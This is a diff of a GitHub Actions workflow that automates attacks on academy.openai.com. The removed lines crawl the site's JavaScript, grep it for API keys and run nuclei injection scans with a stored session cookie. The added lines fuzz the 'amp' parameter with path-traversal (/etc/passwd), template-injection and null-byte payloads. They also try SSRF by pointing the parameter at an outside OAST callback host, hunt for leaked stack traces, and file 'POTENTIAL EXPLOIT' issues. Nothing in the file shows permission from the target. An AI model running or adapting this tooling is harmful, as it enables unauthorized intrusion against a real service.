@@ -1,4 +1,4 @@
-name: "Elite Target Exploit — REPAIRED"
+name: "Heavy-Duty Crash Escalation — amp Parameter"
 
 on:
   workflow_dispatch:
@@ -9,83 +9,76 @@ permissions:
 
 env:
   TARGET_URL: "https://academy.openai.com/?amp=test"
-  AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}
+  # Base URL for the parameter we're attacking
+  FUZZ_BASE: "https://academy.openai.com/?amp="
 
 jobs:
-  exploit:
+  escalate_500:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        # Optimized tags that actually exist in the 2026 template library
-        vuln_type: [cve2025, cve2026, xss, ssrf, sqli, takeover]
-
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Install Arsenal
+      - name: Setup Advanced Tools
         run: |
+          go install github.com/ffuf/ffuf/v2@latest
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          go install github.com/projectdiscovery/katana/cmd/katana@latest
-          pip install njsscan
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: 🛠️ Setup Templates
-        run: nuclei -ut # Ensures templates are fresh and paths are correct
-
-      - name: 📂 Step 1:Code Extraction (Fixed Pathing)
+      - name: 🧪 Test 1:Session Isolation (Auth vs No-Auth)
         run: |
-          mkdir -p ./source_code/raw
-          # Using -d 3 to go deeper into the academy site
-          katana -u "$TARGET_URL" -jc -d 3 -em js,json -o ./source_code/endpoints.txt || touch ./source_code/endpoints.txt
-          
-          if [ -s ./source_code/endpoints.txt ]; then
-            # Download first 50 discovered files
-            head -n 50 ./source_code/endpoints.txt | xargs -I % wget -q -P ./source_code/raw/ % || true
-          fi
+          # Check if the 500 happens without a cookie (Server-wide vs User-specific)
+          curl -s -o- -I "${{ env.TARGET_URL }}" > auth_test_no_cookie.txt
+          curl -s -o- -I "${{ env.TARGET_URL }}" -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > auth_test_with_cookie.txt
 
-      - name: 🔍 Step 2:Secret & SAST Scan
+      - name: 🛡️ Test 2:SSRF & OAST Escalation
         run: |
-          # Only run if directory exists and isn't empty
-          if [ "$(ls -A ./source_code/raw/)" ]; then
-            njsscan ./source_code/raw/ --sarif -o sast_report.sarif || true
-            grep -rE "sk-[a-zA-Z0-9]{32,}|ai_[a-zA-Z0-9_\-]{20,}" ./source_code/raw/ > discovered_secrets.txt || true
-          else
-            echo "No JS files found to analyze." > discovered_secrets.txt
-          fi
-
-      - name: 🛡️ Step 3:Header Injection (Updated Path)
-        run: |
-          # Using the generic 'fuzzing' and 'injection' tags instead of broken file paths
-          nuclei -u "$TARGET_URL" \
-            -tags xss,ssrf,generic-injection \
-            -header "Cookie: $AUTH_COOKIE" \
-            -header "X-Forwarded-Host: exploit.oast.fun" \
+          # If 'amp' is trying to fetch a page, this will trigger a hit on interact.sh
+          # This is a common way to turn a 500 error into a Critical SSRF
+          nuclei -u "${{ env.FUZZ_BASE }}http://{{interactsh-url}}" \
+            -t http/vulnerabilities/generic/ssrf-fuzz.yaml \
             -interactsh-server oast.fun \
-            -o header_exploits.txt || true
+            -o ssrf_results.txt || true
 
-      - name: ☢️ Step 4:High-Intensity Scan (Fixed Tags)
+      - name: ☢️ Test 3:Language-Specific Crash (Python/JS/Go)
         run: |
-          # Removed the '-dast' flag because it limits template selection too strictly
-          nuclei -u "$TARGET_URL" \
-            -tags ${{ matrix.vuln_type }} \
-            -header "Cookie: $AUTH_COOKIE" \
-            -severity critical,high,medium \
-            -rl 50 -bs 25 \
-            -o nuclei_results.txt
+          # Using FFuF to send payloads that break specific backends
+          # Including: Null bytes, Template Injection, and Path Traversal
+          cat <<EOF > payloads.txt
+          %00
+          ../../../../etc/passwd
+          {{7*7}}
+          \${7*7}
+          [object%20Object]
+          undefined
+          NaN
+          true
+          false
+          -1
+          99999999999999999999
+          EOF
+          
+          ffuf -u "${{ env.FUZZ_BASE }}FUZZ" \
+               -w payloads.txt \
+               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" \
+               -mc 500 -o crash_matrix.json
 
-      - name: 💾 Step 5:Secure Result Sync
+      - name: 📊 Test 4:Information Leakage Check
+        run: |
+          # Specifically look for "Stack Traces" in the 500 response body
+          curl -s "${{ env.TARGET_URL }}" -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > full_error.html
+          grep -iE "at |line |file |stack|exception|debug|trace|vendor|node_modules" full_error.html > leaked_info.txt || true
+
+      - name: 🚨 High-Impact Report
         if: always()
         run: |
-          git config --local user.email "bot@hacker.ai"
-          git config --local user.name "Exploit-Bot"
-          
-          for i in {1..10}; do
-            git pull origin main --rebase
-            mkdir -p "findings/${{ matrix.vuln_type }}"
-            cp *.txt "findings/${{ matrix.vuln_type }}/" 2>/dev/null || true
-            git add findings/
-            git commit -m "Exploit Intelligence: ${{ matrix.vuln_type }}" && git push origin main && break || sleep 10
-          done
+          # Analyze if any payload changed the size of the 500 error
+          # A larger 500 error often means a stack trace was returned!
+          if [ -s leaked_info.txt ] || [ -s ssrf_results.txt ]; then
+             REPORT="### 🚨 CRITICAL DATA LEAKED\n"
+             [ -s leaked_info.txt ] && REPORT+="\n#### Potential Stack Trace Found:\n\`\`\`\n$(cat leaked_info.txt | head -n 10)\n\`\`\`"
+             [ -s ssrf_results.txt ] && REPORT+="\n#### SSRF Triggered:\n$(cat ssrf_results.txt)"
+             
+             curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+               -H "Content-Type: application/json" \
+               https://api.github.com/repos/${{ github.repository }}/issues \
+               -d "{\"title\":\"🚨 POTENTIAL EXPLOIT: amp 500 Escalation\",\"body\":\"$REPORT\"}"
+          fi
           
